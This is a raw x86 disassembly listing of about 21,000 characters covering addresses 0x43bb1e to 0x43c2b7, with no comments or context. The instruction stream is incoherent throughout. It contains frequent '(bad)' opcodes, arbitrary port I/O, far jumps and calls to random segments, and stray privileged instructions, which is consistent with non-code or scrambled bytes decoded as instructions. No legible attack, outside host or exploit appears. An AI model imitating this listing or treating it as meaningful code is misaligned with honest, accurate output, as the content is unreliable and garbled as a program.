  43bb1e:	push   es
  43bb1f:	dec    ecx
  43bb20:	inc    eax
  43bb21:	lods   al,BYTE PTR ds:[esi]
  43bb22:	in     al,dx
  43bb23:	out    0xb7,al
  43bb25:	dec    edi
  43bb26:	add    ebp,DWORD PTR [edi]
  43bb28:	test   eax,0x606d6a3b
  43bb2d:	and    cl,BYTE PTR [ecx-0x13]
  43bb30:	aad    0xb6
  43bb32:	sbb    al,0x88
  43bb34:	mov    ah,0xa
  43bb36:	inc    eax
  43bb37:	jb     0x43bb60
  43bb39:	xor    eax,eax
  43bb3b:	mov    ch,BYTE PTR [edi]
  43bb3d:	add    BYTE PTR [edi],ch
  43bb3f:	pushf  
  43bb40:	fcomp  QWORD PTR [eax+0x360aee2c]
  43bb46:	cwde   
  43bb47:	test   BYTE PTR [esi+0x32c30e93],al
  43bb4d:	cmp    bl,bh
  43bb4f:	mov    ds:0x363daa45,eax
  43bb54:	(bad)  
  43bb55:	jecxz  0x43bb07
  43bb57:	fs std 
  43bb59:	test   DWORD PTR [eax+0x297c7b02],ecx
  43bb5f:	out    0x70,al
  43bb61:	jmp    0x59b5:0x50b2f4a1
  43bb68:	hlt    
  43bb69:	pop    esi
  43bb6a:	or     dl,BYTE PTR [edi-0x1]
  43bb6d:	cmp    al,0x9d
  43bb6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bb70:	call   0x2772:0x3f438ef
  43bb77:	retf   0xc900
  43bb7a:	or     bl,BYTE PTR [edx-0x30a48d94]
  43bb80:	je     0x43bb3f
  43bb82:	lods   al,BYTE PTR ds:[esi]
  43bb83:	fdivr  QWORD PTR [ebp+0x70]
  43bb86:	inc    ebx
  43bb87:	add    DWORD PTR [edi],ecx
  43bb89:	inc    esp
  43bb8a:	idiv   BYTE PTR [eax]
  43bb8c:	inc    edi
  43bb8d:	pusha  
  43bb8e:	inc    ebx
  43bb8f:	lock inc eax
  43bb91:	ror    BYTE PTR ds:0x8da56244,0x30
  43bb98:	add    al,0xe3
  43bb9a:	xchg   DWORD PTR [eax-0x35313d5e],esi
  43bba0:	fwait
  43bba1:	shr    BYTE PTR [ebp+0x1cf058e9],cl
  43bba7:	pop    ss
  43bba8:	mov    ah,0xcd
  43bbaa:	add    eax,0x10090578
  43bbaf:	xchg   ecx,eax
  43bbb0:	mov    BYTE PTR [esi+0x5d],ah
  43bbb3:	dec    eax
  43bbb4:	cmp    bl,BYTE PTR fs:[edx]
  43bbb7:	js     0x43bc36
  43bbb9:	ret    0x8f68
  43bbbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bbbd:	es loopne 0x43bbca
  43bbc0:	call   0x3859ab1d
  43bbc5:	mov    ah,0xb5
  43bbc7:	sbb    al,0x56
  43bbc9:	push   esi
  43bbca:	fadd   DWORD PTR [edi]
  43bbcc:	sbb    bh,BYTE PTR [ecx-0x75]
  43bbcf:	(bad)  
  43bbd0:	sbb    DWORD PTR ds:0x6fe2,edx
  43bbd5:	inc    edi
  43bbd6:	jmp    0x43bb59
  43bbd8:	lock pop edx
  43bbda:	inc    edx
  43bbdb:	mov    ecx,0xcae9498e
  43bbe0:	loope  0x43bbea
  43bbe2:	add    al,0xb6
  43bbe4:	lods   al,BYTE PTR ds:[esi]
  43bbe5:	call   0xe1729119
  43bbea:	lahf   
  43bbeb:	mov    al,ds:0x5aecb00a
  43bbf0:	fadd   QWORD PTR ss:[eax+0x70]
  43bbf4:	(bad)  
  43bbf5:	ins    BYTE PTR es:[edi],dx
  43bbf6:	test   DWORD PTR [ebp+0x49],edx
  43bbf9:	mov    ch,BYTE PTR [edx-0x78]
  43bbfc:	pop    eax
  43bbfd:	fs pop edx
  43bbff:	push   0xffffffb7
  43bc01:	mov    eax,ds:0x2a0e1bcd
  43bc06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bc07:	add    BYTE PTR [edi+ecx*2-0x7c92c7a2],ch
  43bc0e:	or     edx,edx
  43bc10:	dec    esp
  43bc11:	or     al,0xc2
  43bc13:	inc    ebp
  43bc14:	stc    
  43bc15:	mov    BYTE PTR [ebp-0x7e],ch
  43bc18:	mov    cl,BYTE PTR [edi+0x5b]
  43bc1b:	(bad)  
  43bc1c:	mov    esi,0x3a2a27a6
  43bc21:	and    BYTE PTR [edx+eax*4+0x4604baf7],dh
  43bc28:	xchg   ebp,eax
  43bc29:	stos   BYTE PTR es:[edi],al
  43bc2a:	xor    BYTE PTR [edx],ch
  43bc2c:	dec    ecx
  43bc2d:	xlat   BYTE PTR ds:[ebx]
  43bc2e:	test   BYTE PTR [esi-0x79],bl
  43bc31:	pushf  
  43bc32:	ret    
  43bc33:	xor    dl,BYTE PTR [esp+ebp*2-0x54]
  43bc37:	jns    0x43bc27
  43bc39:	mov    al,ds:0xba33aa2d
  43bc3e:	pop    edx
  43bc3f:	sbb    DWORD PTR [esi+eax*1],0x866d0a0d
  43bc46:	test   DWORD PTR [eax],eax
  43bc48:	rol    BYTE PTR [edx],cl
  43bc4a:	mov    cl,0x24
  43bc4c:	js     0x43bc84
  43bc4e:	push   edi
  43bc4f:	cmp    dh,BYTE PTR [edx+ebp*4+0x46844ae2]
  43bc56:	jl     0x43bc9f
  43bc58:	mov    edx,0x46534bd7
  43bc5d:	mov    ebx,0xf488a214
  43bc62:	and    eax,ebp
  43bc64:	xor    al,0xd0
  43bc66:	lods   al,BYTE PTR ds:[esi]
  43bc67:	sub    bl,BYTE PTR [ecx-0x60]
  43bc6a:	call   0xb8b9808e
  43bc6f:	add    al,0xf5
  43bc71:	xchg   edx,eax
  43bc72:	adc    BYTE PTR [esi],0x8e
  43bc75:	inc    esp
  43bc76:	ret    
  43bc77:	push   eax
  43bc78:	aas    
  43bc79:	or     DWORD PTR ds:0x6a1c0800,ebp
  43bc7f:	int    0x96
  43bc81:	sub    dh,BYTE PTR ss:[esi+0xa89122b]
  43bc88:	mov    BYTE PTR [ebp+0x1e3e6e2],dh
  43bc8e:	mov    al,ds:0x5080ee4f
  43bc93:	enter  0x7188,0x2
  43bc97:	adc    DWORD PTR [eax+0x65],esi
  43bc9a:	mov    dl,BYTE PTR [ebx-0x4956099c]
  43bca0:	add    DWORD PTR [esi+0x7cce341c],esi
  43bca6:	inc    edi
  43bca7:	addr16 and dl,cl
  43bcaa:	push   esi
  43bcab:	call   0x7620:0xe027c563
  43bcb2:	dec    edx
  43bcb3:	mov    edi,0x82e294fc
  43bcb8:	inc    edi
  43bcb9:	pop    edx
  43bcba:	sbb    esp,DWORD PTR [edx-0x53]
  43bcbd:	sbb    edi,DWORD PTR [eax+0x63]
  43bcc0:	add    BYTE PTR [eax-0xf3d6710],al
  43bcc6:	rcl    BYTE PTR [eax+0x3f124f04],0x45
  43bccd:	mov    ebp,0xd2f8f55a
  43bcd2:	jae    0x43bd01
  43bcd4:	jmp    0xb0478ce9
  43bcd9:	repnz stos DWORD PTR es:[edi],eax
  43bcdb:	xchg   esi,eax
  43bcdc:	lods   eax,DWORD PTR cs:[esi]
  43bcde:	add    eax,0x640a08cd
  43bce3:	xchg   DWORD PTR [eax],esi
  43bce5:	push   eax
  43bce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bce7:	or     BYTE PTR [edi+0x18],0xf
  43bceb:	je     0x43bd5c
  43bced:	nop
  43bcee:	mov    dl,0x15
  43bcf0:	in     al,0x8d
  43bcf2:	xor    BYTE PTR [esi],dl
  43bcf4:	sar    BYTE PTR [ecx-0x4033a52a],0x2
  43bcfb:	lahf   
  43bcfc:	add    DWORD PTR [ebp+edi*1+0x130e7370],esi
  43bd03:	push   es
  43bd04:	sbb    eax,0x9c7e16d7
  43bd09:	loop   0x43bc96
  43bd0b:	ror    al,cl
  43bd0d:	test   BYTE PTR [esi+0x6f],0xe1
  43bd11:	mov    bl,0xa0
  43bd13:	sub    ebx,DWORD PTR [esi]
  43bd15:	out    0xf2,al
  43bd17:	adc    BYTE PTR [edi],ch
  43bd19:	adc    BYTE PTR [edi-0xbea3640],0xa1
  43bd20:	jo     0x43bd4c
  43bd22:	dec    edi
  43bd23:	(bad)  
  43bd24:	push   ebx
  43bd25:	ror    BYTE PTR [ebx+0x5b],0xa0
  43bd29:	leave  
  43bd2a:	pop    es
  43bd2b:	push   ss
  43bd2c:	ror    BYTE PTR [eax],1
  43bd2e:	jmp    0x102a:0x277e68cc
  43bd35:	sar    BYTE PTR [eax-0x36],1
  43bd38:	(bad)  
  43bd39:	lods   al,BYTE PTR ds:[esi]
  43bd3a:	in     al,0x1
  43bd3c:	test   al,0x52
  43bd3e:	push   edx
  43bd3f:	jmp    0x43bd79
  43bd41:	or     eax,0x350e061c
  43bd46:	sbb    ch,BYTE PTR [edx+0x78007c29]
  43bd4c:	mov    dl,0xb1
  43bd4e:	es jno 0x43bdc6
  43bd51:	dec    eax
  43bd52:	cmp    dl,BYTE PTR [esi-0x54edd42e]
  43bd58:	or     bl,BYTE PTR [ecx*8-0x5db9a16c]
  43bd5f:	test   BYTE PTR [esi+0x5c],cl
  43bd62:	das    
  43bd63:	push   ebx
  43bd64:	or     eax,0x6381ca9b
  43bd69:	push   cs
  43bd6a:	(bad)  
  43bd6b:	sbb    bl,BYTE PTR [ecx-0x3a]
  43bd6e:	push   cs
  43bd6f:	rol    DWORD PTR [esi-0xfbd49d8],1
  43bd75:	cmp    ah,0x12
  43bd78:	mov    al,0xe0
  43bd7a:	xchg   esp,eax
  43bd7b:	sbb    DWORD PTR [eax],ebx
  43bd7d:	adc    DWORD PTR [ecx-0x655e5830],edi
  43bd83:	inc    ecx
  43bd84:	or     eax,0xe268886d
  43bd89:	ss sbb eax,0x5de8d8da
  43bd8f:	fild   WORD PTR [edx+0x21213457]
  43bd95:	mov    bl,0xea
  43bd97:	rol    BYTE PTR [edx],0x1e
  43bd9a:	xchg   DWORD PTR [ebx+ecx*2+0x4c550fe6],esi
  43bda1:	pop    eax
  43bda2:	mov    ch,BYTE PTR [edx+0x36]
  43bda5:	fdivr  DWORD PTR [edi+ebp*2-0x34]
  43bda9:	dec    ebp
  43bdaa:	call   0x4dba2672
  43bdaf:	(bad)  
  43bdb0:	in     eax,0x1
  43bdb2:	mov    ebp,0xfc84d4a2
  43bdb7:	mov    ds:0x80fd263,al
  43bdbd:	lahf   
  43bdbe:	xor    BYTE PTR [ecx],0x2b
  43bdc1:	repnz lea ecx,[esi+0x6]
  43bdc5:	cmp    al,0xd5
  43bdc7:	fcom   DWORD PTR [ebx+0x5b]
  43bdca:	push   edx
  43bdcb:	add    BYTE PTR [eax+0x2b841876],ah
  43bdd1:	fcomp  DWORD PTR [ecx+edx*8+0x6a99ad7d]
  43bdd8:	(bad)
  43bddc:	lahf   
  43bddd:	fcom   QWORD PTR [edi]
  43bddf:	and    al,ch
  43bde1:	add    al,0xda
  43bde3:	daa    
  43bde4:	or     eax,esi
  43bde6:	mov    ecx,0x41140a24
  43bdeb:	lods   al,BYTE PTR ds:[esi]
  43bdec:	mov    BYTE PTR [edi-0x3f1796d4],bl
  43bdf2:	ret    0x68c3
  43bdf5:	mov    ebx,0x1c5c7564
  43bdfa:	push   ds
  43bdfb:	mov    al,0x69
  43bdfd:	xor    eax,0x7796cd58
  43be02:	push   ds
  43be03:	in     al,0xda
  43be05:	rol    BYTE PTR [eax],0xaf
  43be08:	lods   al,BYTE PTR ds:[esi]
  43be09:	loopne 0x43be21
  43be0b:	cli    
  43be0c:	bound  eax,QWORD PTR [eax+0x45]
  43be0f:	jecxz  0x43bd9f
  43be11:	push   cs
  43be12:	or     BYTE PTR [edx+ebx*8-0x39e27ed9],0xbc
  43be1a:	out    0x38,eax
  43be1c:	sub    al,0x70
  43be1e:	pusha  
  43be1f:	and    DWORD PTR [edx+esi*4+0x2a],edx
  43be23:	push   0x1b
  43be25:	cs je  0x43be7e
  43be28:	xor    al,0x38
  43be2a:	ss jbe 0x43be07
  43be2d:	jp     0x43bea1
  43be2f:	inc    esp
  43be30:	mov    ?,WORD PTR [eax+0x34]
  43be33:	xchg   ebp,eax
  43be34:	xor    eax,0xaaa05f1b
  43be39:	mov    eax,ds:0x20e8eeac
  43be3e:	push   ds
  43be3f:	and    al,0x86
  43be41:	call   0x58be8be
  43be46:	in     eax,dx
  43be47:	ret    
  43be48:	enter  0x7675,0xf9
  43be4c:	cwd    
  43be4e:	push   0x4a265bab
  43be53:	add    BYTE PTR [ecx+0x36],dl
  43be56:	sbb    al,0xb
  43be58:	js     0x43be1a
  43be5a:	mov    WORD PTR [ecx+0x7b2c1f98],ds
  43be60:	inc    ebp
  43be61:	lock dec eax
  43be63:	cmp    al,0x4
  43be65:	js     0x43be4a
  43be67:	ja     0x43be05
  43be69:	or     BYTE PTR ds:0x365a9b5c,ah
  43be6f:	and    eax,0xb22440b6
  43be74:	push   ecx
  43be75:	add    eax,0xb50eca41
  43be7a:	fimul  DWORD PTR es:[edi]
  43be7d:	mov    ebp,0x36199706
  43be82:	pusha  
  43be83:	sub    dh,dl
  43be85:	in     al,0x9f
  43be87:	ins    DWORD PTR es:[edi],dx
  43be88:	mov    ch,0xf
  43be8a:	pushf  
  43be8b:	xchg   edx,eax
  43be8c:	and    eax,DWORD PTR [ebx+edx*1]
  43be8f:	dec    esp
  43be90:	adc    esp,DWORD PTR [esi+0x6050505a]
  43be96:	hlt    
  43be97:	sub    ch,BYTE PTR [ecx]
  43be99:	pusha  
  43be9a:	fcomip st,st(0)
  43be9c:	or     eax,DWORD PTR [ecx-0x30]
  43be9f:	mov    eax,ds:0xd44065a4
  43bea4:	test   al,0x32
  43bea6:	nop
  43bea7:	pop    edx
  43bea8:	aad    0xa
  43beaa:	or     bh,0x10
  43bead:	rcr    DWORD PTR [edx-0x17],cl
  43beb0:	fiadd  WORD PTR [ecx+0x5a3e36cf]
  43beb6:	cmp    esp,esi
  43beb8:	sub    al,0x36
  43beba:	mov    bh,0x52
  43bebc:	stos   BYTE PTR es:[edi],al
  43bebd:	cmp    dl,BYTE PTR [edx+ebx*8]
  43bec0:	inc    edx
  43bec1:	sbb    BYTE PTR [ebx+0xa],cl
  43bec4:	das    
  43bec5:	or     al,0x74
  43bec7:	scas   al,BYTE PTR es:[edi]
  43bec8:	idiv   BYTE PTR [esi+0xbcca177]
  43bece:	mov    dh,0x3
  43bed0:	push   ds
  43bed1:	pushf  
  43bed2:	or     bl,ch
  43bed4:	loope  0x43be96
  43bed6:	stos   BYTE PTR es:[edi],al
  43bed7:	add    BYTE PTR [edi-0x2bfbb2a7],bh
  43bedd:	mov    ds:0x508a8cf6,al
  43bee2:	add    eax,0x7e7049e3
  43bee7:	data16 rol BYTE PTR ds:0xeca6d54,1
  43beee:	adc    BYTE PTR [esi],al
  43bef0:	dec    edx
  43bef1:	js     0x43be8d
  43bef3:	test   al,0xd0
  43bef5:	test   eax,0x4de0b1a6
  43befa:	pop    ss
  43befb:	and    BYTE PTR [esp+edx*1],al
  43befe:	into   
  43beff:	aaa    
  43bf00:	pop    eax
  43bf01:	sub    al,0x5a
  43bf03:	(bad)  
  43bf04:	and    DWORD PTR [esi+edi*2+0x2272b05e],ecx
  43bf0b:	pop    esi
  43bf0c:	sbb    al,0x82
  43bf0e:	push   esi
  43bf0f:	push   esp
  43bf10:	shl    BYTE PTR [esi-0x3f],1
  43bf13:	pushw  0x65f2
  43bf17:	les    eax,FWORD PTR ds:0x8f0d809c
  43bf1d:	(bad)  
  43bf1e:	adc    esi,DWORD PTR [edx+eiz*8+0xa]
  43bf22:	cmp    BYTE PTR [ebx-0x5c],ch
  43bf25:	inc    edx
  43bf26:	shl    DWORD PTR [ebp+0x143c6450],cl
  43bf2c:	test   dl,ah
  43bf2e:	jb     0x43bf45
  43bf30:	push   esp
  43bf31:	test   DWORD PTR [edx],ecx
  43bf33:	dec    edx
  43bf34:	adc    BYTE PTR [esi+0x26178d3c],ch
  43bf3a:	pop    esi
  43bf3b:	pop    eax
  43bf3c:	xor    bl,BYTE PTR [esi]
  43bf3e:	cmp    al,0xe
  43bf40:	dec    esp
  43bf41:	fcomp  DWORD PTR [esi]
  43bf43:	and    al,0x6c
  43bf45:	sbb    BYTE PTR [ebp-0x68],0x24
  43bf49:	test   eax,0x8057e040
  43bf4e:	les    ecx,FWORD PTR [eax-0x58]
  43bf51:	pop    eax
  43bf52:	xchg   esp,ecx
  43bf54:	sub    BYTE PTR [edx-0x7c],bh
  43bf57:	mov    cl,0x14
  43bf59:	xchg   esi,eax
  43bf5a:	add    eax,esi
  43bf5c:	call   0x2a93:0xac0b544a
  43bf63:	pop    edx
  43bf64:	jle    0x43bfa8
  43bf66:	jo     0x43bf08
  43bf68:	(bad)  
  43bf69:	dec    ebp
  43bf6a:	push   edx
  43bf6b:	adc    al,al
  43bf6d:	adc    ebp,DWORD PTR [eax+0x70]
  43bf70:	loop   0x43bf6e
  43bf72:	je     0x43bff0
  43bf74:	push   es
  43bf75:	mov    ah,0x44
  43bf77:	test   edi,ecx
  43bf79:	fmul   QWORD PTR [ecx+0x69]
  43bf7c:	test   BYTE PTR [ecx+edx*8],bl
  43bf7f:	in     al,dx
  43bf80:	xchg   ebx,eax
  43bf81:	or     DWORD PTR [edx-0x15],ebx
  43bf84:	adc    esi,DWORD PTR [eax-0x72]
  43bf87:	in     eax,0xd
  43bf89:	pop    ebp
  43bf8a:	inc    ecx
  43bf8b:	pop    edx
  43bf8c:	mov    al,ds:0x98160aef
  43bf91:	pop    ebp
  43bf92:	(bad)  
  43bf93:	push   esi
  43bf94:	cwde   
  43bf95:	pop    esi
  43bf96:	adc    dl,ah
  43bf98:	xchg   esi,eax
  43bf99:	loop   0x43bf47
  43bf9b:	inc    eax
  43bf9c:	outs   dx,BYTE PTR ds:[esi]
  43bf9d:	mov    DWORD PTR [ebp-0x3bbeb9fb],esp
  43bfa3:	inc    edx
  43bfa4:	dec    eax
  43bfa5:	pop    eax
  43bfa6:	jo     0x43bfb1
  43bfa8:	loope  0x43bf41
  43bfaa:	js     0x43bf38
  43bfac:	test   BYTE PTR [eax+0x2ad91de4],cl
  43bfb2:	mov    dl,0x2e
  43bfb4:	inc    esp
  43bfb5:	rol    BYTE PTR [ecx+0x1],1
  43bfb8:	stos   BYTE PTR es:[edi],al
  43bfb9:	dec    ecx
  43bfba:	or     DWORD PTR [eax+ebp*8+0x2f5a7ce6],eax
  43bfc1:	push   ecx
  43bfc2:	out    dx,al
  43bfc3:	es test al,0x2d
  43bfc6:	mov    ebx,0xcfac6fe0
  43bfcb:	add    al,0x16
  43bfcd:	jb     0x43c03b
  43bfcf:	popa   
  43bfd0:	jle    0x43bf89
  43bfd2:	dec    esp
  43bfd3:	add    dh,ah
  43bfd5:	pop    ebp
  43bfd6:	(bad)  
  43bfd7:	xor    BYTE PTR [edx],bh
  43bfd9:	sub    ebx,DWORD PTR [ebp+edi*8+0x0]
  43bfdd:	xor    BYTE PTR [ebx+0x29],bl
  43bfe0:	inc    eax
  43bfe1:	and    al,0x10
  43bfe3:	clc    
  43bfe4:	jle    0x43c038
  43bfe6:	mov    cl,0x3d
  43bfe8:	sar    BYTE PTR [eax+0x34],1
  43bfeb:	sbb    dh,BYTE PTR [ebx-0x535921f4]
  43bff1:	out    0x44,eax
  43bff3:	pusha  
  43bff4:	sti    
  43bff5:	xor    bh,BYTE PTR [edi+ecx*4]
  43bff8:	xchg   esp,eax
  43bff9:	in     eax,0xab
  43bffb:	adc    ch,dh
  43bffd:	or     bh,dl
  43bfff:	fcmovu st,st(4)
  43c001:	loopne 0x43c019
  43c003:	ret    
  43c004:	shl    BYTE PTR [ebp-0x61c3b78a],cl
  43c00a:	push   0xffffffef
  43c00c:	and    ah,BYTE PTR [edx]
  43c00e:	sar    BYTE PTR [ebx],1
  43c010:	adc    BYTE PTR [ebp-0x20],ch
  43c013:	adc    DWORD PTR [eax-0x3bc73553],esp
  43c019:	inc    ecx
  43c01a:	push   0x307656a0
  43c01f:	push   esi
  43c020:	pop    ebp
  43c021:	stos   DWORD PTR es:[edi],eax
  43c022:	fdivr  st,st(3)
  43c024:	cli    
  43c025:	mov    ebp,0xc686834e
  43c02a:	adc    DWORD PTR [eax+0x553416d7],esp
  43c030:	call   0x81afe68e
  43c035:	add    DWORD PTR [esp+eax*4-0x1f],ebx
  43c039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c03a:	jl     0x43c091
  43c03c:	xor    al,0x21
  43c03e:	and    eax,0x8fd03c00
  43c043:	xchg   esp,eax
  43c044:	mov    edx,DWORD PTR [edi]
  43c046:	lods   al,BYTE PTR ds:[esi]
  43c047:	push   0xffffffa9
  43c049:	sbb    al,0x9c
  43c04b:	retf   0xb861
  43c04e:	jbe    0x43c058
  43c050:	test   al,0xe0
  43c052:	inc    edi
  43c053:	icebp  
  43c054:	lock xor BYTE PTR [eax-0x6b],bh
  43c058:	mov    eax,0xc0533db4
  43c05d:	pop    ebx
  43c05e:	sub    eax,0xc61c2412
  43c063:	cdq    
  43c064:	mov    eax,ds:0x74a47829
  43c069:	or     al,0x4e
  43c06b:	stos   BYTE PTR es:[edi],al
  43c06c:	lahf   
  43c06d:	xchg   BYTE PTR [edi+edi*4-0x50],ah
  43c071:	ret    0x387a
  43c074:	js     0x43c0ae
  43c076:	ret    
  43c077:	mov    BYTE PTR [ecx+eax*4+0x51],dl
  43c07b:	and    DWORD PTR [eax-0x1d072b96],edi
  43c081:	adc    al,dl
  43c083:	lock mov BYTE PTR [edx+0x1fe6ca4e],cl
  43c08a:	inc    ebp
  43c08b:	dec    esi
  43c08c:	or     edx,DWORD PTR [edi]
  43c08e:	call   0xfa08:0x81f8de70
  43c095:	inc    ecx
  43c096:	mov    ah,0xda
  43c098:	fsub   QWORD PTR [edx+ecx*4]
  43c09b:	shr    edx,cl
  43c09d:	xchg   edx,eax
  43c09e:	rol    BYTE PTR [edi],0x5e
  43c0a1:	aam    0xec
  43c0a3:	aas    
  43c0a4:	cs jle 0x43c0f9
  43c0a7:	clc    
  43c0a8:	sub    BYTE PTR [edx+0x1f140800],ch
  43c0ae:	shl    BYTE PTR [esi+0x2247c206],1
  43c0b4:	adc    edx,esi
  43c0b6:	mov    bl,al
  43c0b8:	(bad)  
  43c0b9:	test   BYTE PTR [esi+edi*1],0x0
  43c0bd:	xchg   BYTE PTR [edx],ah
  43c0bf:	das    
  43c0c0:	add    al,BYTE PTR [ebp+0x3c]
  43c0c3:	and    cl,dh
  43c0c5:	retf   0xddfe
  43c0c8:	push   cs
  43c0c9:	mov    edx,0x44361d43
  43c0ce:	scas   eax,DWORD PTR es:[edi]
  43c0cf:	mov    eax,0xa8fef7c9
  43c0d4:	mov    cs,WORD PTR [esi]
  43c0d6:	and    eax,0xe6721c1a
  43c0db:	xchg   edi,eax
  43c0dc:	test   BYTE PTR [edx+0x0],al
  43c0df:	pop    edx
  43c0e0:	aaa    
  43c0e1:	mov    edx,es
  43c0e3:	data16 mov al,ds:0x440fe558
  43c0e9:	sub    eax,0x36166cb8
  43c0ee:	or     eax,0xe9d1e61a
  43c0f3:	jl     0x43c0d7
  43c0f5:	(bad)  
  43c0f6:	adc    ebp,DWORD PTR [esi-0x40]
  43c0f9:	adc    BYTE PTR [ecx],bl
  43c0fb:	bound  esi,QWORD PTR ds:0x156819b0
  43c101:	jb     0x43c149
  43c103:	or     BYTE PTR [edi+eiz*8-0x19],cl
  43c107:	mov    bh,BYTE PTR [edx+0x1cb023a1]
  43c10d:	mov    eax,DWORD PTR [ebp+edx*1+0x1a]
  43c111:	inc    eax
  43c112:	xchg   edi,eax
  43c113:	aam    0x94
  43c115:	mov    edi,DWORD PTR [eax+esi*8+0x5e3d002e]
  43c11c:	jle    0x43c0a0
  43c11e:	sahf   
  43c11f:	aaa    
  43c120:	mov    esi,edx
  43c122:	pop    esp
  43c123:	xor    bl,BYTE PTR [ecx+0x68]
  43c126:	mov    dl,0x7
  43c128:	mov    edx,0x3b121d44
  43c12d:	sub    ah,BYTE PTR [edi+eax*2+0x24]
  43c131:	test   eax,0xda72a08d
  43c136:	in     al,dx
  43c137:	mov    cl,0xb4
  43c139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c13a:	bnd jge 0x43c0cd
  43c13d:	cmp    dl,BYTE PTR [ebp-0x7f20c50c]
  43c143:	or     al,BYTE PTR [ebp+edi*1+0x48]
  43c147:	stos   BYTE PTR es:[edi],al
  43c148:	retf   0x44f2
  43c14b:	push   0x3ad1a1db
  43c150:	out    dx,eax
  43c151:	test   BYTE PTR [ebp-0x66],ah
  43c154:	and    al,0x56
  43c156:	cmp    bl,BYTE PTR [esi]
  43c158:	leave  
  43c159:	add    bl,BYTE PTR [esi-0x68]
  43c15c:	mov    dh,0x83
  43c15e:	daa    
  43c15f:	in     eax,dx
  43c160:	aas    
  43c161:	mov    dl,0xf0
  43c163:	inc    eax
  43c164:	daa    
  43c165:	cmp    al,BYTE PTR [edx+0x7400d3f5]
  43c16b:	push   0x0
  43c16d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c16e:	sub    BYTE PTR ds:0x6d10c153,ch
  43c174:	add    al,0x45
  43c176:	mov    BYTE PTR [eax+0x1ef08200],0x61
  43c17d:	pusha  
  43c17e:	xchg   edi,eax
  43c17f:	mov    ebp,0x50162b04
  43c184:	sbb    DWORD PTR ss:[ecx],esp
  43c187:	pop    ebp
  43c188:	inc    edx
  43c189:	adc    DWORD PTR [eax],eax
  43c18b:	bound  edx,QWORD PTR [esi]
  43c18d:	mov    ?,WORD PTR [ebx-0x7949f47]
  43c193:	mov    al,ds:0x82626b7a
  43c198:	call   0x43b6:0x945fc492
  43c19f:	xchg   esi,eax
  43c1a0:	lock adc BYTE PTR [esi+0x6c],cl
  43c1a4:	and    bh,BYTE PTR [ecx*2+0x10151874]
  43c1ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c1ac:	push   eax
  43c1ad:	xchg   esi,eax
  43c1ae:	xchg   BYTE PTR [edi],cl
  43c1b0:	add    DWORD PTR [edi+0x3831b6fe],ebp
  43c1b6:	repz cwde 
  43c1b8:	push   esp
  43c1b9:	cmc    
  43c1ba:	adc    eax,eax
  43c1bc:	loop   0x43c18c
  43c1be:	push   0x5
  43c1c0:	cmc    
  43c1c1:	rol    dl,cl
  43c1c3:	mov    bl,0xac
  43c1c5:	push   ds
  43c1c6:	(bad)  
  43c1c7:	and    al,dh
  43c1c9:	test   ax,0x2a94
  43c1cd:	push   cs
  43c1ce:	mov    WORD PTR [edi],es
  43c1d0:	inc    edx
  43c1d1:	sub    al,0xc4
  43c1d3:	mov    bl,0xab
  43c1d5:	cwde   
  43c1d6:	cmp    BYTE PTR [edx-0x25],al
  43c1d9:	dec    ebp
  43c1da:	xchg   esp,eax
  43c1db:	jle    0x43c223
  43c1dd:	add    ch,bh
  43c1df:	push   edx
  43c1e0:	std    
  43c1e1:	xchg   esp,eax
  43c1e2:	sub    DWORD PTR [ebp-0x27c1984b],0x694018b8
  43c1ec:	shr    BYTE PTR [eax+ecx*2-0x28],1
  43c1f0:	add    esp,ecx
  43c1f2:	add    ecx,DWORD PTR [edx-0x76715649]
  43c1f8:	loop   0x43c228
  43c1fa:	inc    eax
  43c1fb:	xchg   DWORD PTR [edx+0x5813e36],esi
  43c201:	je     0x43c1f1
  43c203:	dec    ecx
  43c204:	jno    0x8b2cc034
  43c20a:	das    
  43c20b:	test   BYTE PTR [esi-0x37f85926],ah
  43c211:	sbb    al,0xa
  43c213:	xchg   esi,eax
  43c214:	imul   esp,DWORD PTR [eax+0x440e3be9],0xfffffffc
  43c21b:	mov    esp,0xde00c8b8
  43c220:	pusha  
  43c221:	jecxz  0x43c27b
  43c223:	ret    0x23aa
  43c226:	push   ebx
  43c227:	ret    0x2a53
  43c22a:	or     eax,0xed05a94d
  43c22f:	(bad)  
  43c231:	mov    ecx,0x31e0bca
  43c236:	add    DWORD PTR es:[ebx+0x48],0x7674a02f
  43c23e:	push   cs
  43c23f:	or     BYTE PTR [edx+0x3883045e],cl
  43c245:	xor    ah,ch
  43c247:	add    bl,bh
  43c249:	(bad)  
  43c24a:	push   eax
  43c24b:	dec    esp
  43c24c:	mov    BYTE PTR ds:0xa2ea087,dl
  43c252:	sbb    al,0x94
  43c254:	cs xchg ebx,eax
  43c256:	xor    al,bl
  43c258:	pop    es
  43c259:	les    esp,FWORD PTR [edx]
  43c25b:	xor    al,0x16
  43c25d:	test   eax,0xe01c55a1
  43c262:	push   edi
  43c263:	xor    al,0xc
  43c265:	push   ss
  43c266:	or     DWORD PTR [esi],0x6d
  43c269:	push   cs
  43c26a:	mov    al,ds:0x4f7e4d56
  43c26f:	add    al,0x95
  43c271:	call   0x3c39:0x869713f4
  43c278:	xor    BYTE PTR [edx+eiz*4],0x2f
  43c27c:	test   eax,0x5660660d
  43c281:	inc    ebp
  43c282:	hlt    
  43c283:	inc    eax
  43c284:	dec    esp
  43c285:	add    DWORD PTR [ecx],ecx
  43c287:	shl    BYTE PTR [ebx+0x51],1
  43c28a:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c28c:	inc    ebx
  43c28d:	imul   edi,DWORD PTR ds:0x19f6f510,0x392a3288
  43c297:	and    BYTE PTR [esi+0x59],bl
  43c29a:	js     0x43c2cc
  43c29c:	int3   
  43c29d:	mov    ebx,0x49488702
  43c2a2:	imul   edx,DWORD PTR [edi+0xaa030f1],0x16
  43c2a9:	xor    eax,0x5c76d0bc
  43c2ae:	lods   eax,DWORD PTR ds:[esi]
  43c2af:	push   edx
  43c2b0:	pop    ebx
  43c2b1:	jae    0x43c30b
  43c2b3:	mov    al,0x3d
  43c2b5:	dec    edx
  43c2b6:	inc    esi
  43c2b7:	ret    0xeb02
